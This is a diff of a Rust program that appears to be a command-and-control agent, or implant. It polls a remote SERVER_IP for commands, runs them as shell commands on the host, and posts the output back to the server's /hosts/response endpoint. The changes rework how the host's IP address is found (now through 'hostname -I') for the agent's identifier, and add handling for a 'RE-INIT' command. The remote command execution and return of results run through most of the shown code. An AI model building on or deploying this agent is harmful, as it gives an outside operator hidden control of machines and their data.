@@ -10,7 +10,6 @@ use std::path::Path;
 use wait_timeout::ChildExt;
 use std::io::Read;
 use dirs;
-use local_ip_address::local_ip;
 use serde::{Deserialize, Serialize};
 
 const SLEEP_TIME: Duration = time::Duration::from_millis(5000);
@@ -110,6 +109,9 @@ fn get_commands(identifier:&str) -> bool {
         if cmd.eq("ERROR"){
             return false
         }
+        if cmd.contains("RE-INIT"){
+            return false
+        }
         print(&format!("{}: {}",cmd_id,cmd));
         handle_command(cmd_id,&cmd,identifier);
     }
@@ -206,7 +208,7 @@ fn run_command(cmd: &str) -> String {
     return cmd_out;
 }
 
-fn post_response(cmd_id: &str, response: &str, identifier: &str){
+fn post_response(cmd_id: &str, response: &str, _identifier: &str){
     let responses_url = format!("{}/hosts/response",SERVER_IP);
     let mut response = response;
     if response.eq("") {
@@ -269,22 +271,18 @@ fn main_loop(identifier:&str) -> Result<String,String>{
 }
 
 fn main(){
-    let mut host_ip = match local_ip(){
-        Ok(ip)=>{
-            ip.to_string()
-        }, Err(_)=>{
-            "127.0.0.1".to_string()
-        }
-    };
     //if its loopback, get the ip from a bash command
     loop{
-        if host_ip.eq("127.0.0.1"){
-            let ip = run_command("ifconfig | grep 'inet ' | head -n 1 | awk '{print $2}'");
+        let mut host_ip = run_command("hostname -I").to_string();
+        if host_ip.eq("127.0.0.1") || host_ip.eq("0.0.0.0"){
+            print(&"Loopback detected, getting ip from bash command.");
+            let ip = run_command("hostname -I");
             host_ip = ip.to_string();
             if host_ip.eq("") {
                 host_ip = "0.0.0.0".to_string(); //if the ip is still empty, set it to 0.0.0.0 (default)
             }
         }
+        host_ip = host_ip.split_whitespace().next().unwrap().to_string(); //get the first ip and remove the whitespace
         let identifier = get_id(&host_ip);
         match main_loop(&identifier){
             Ok(_)=>{
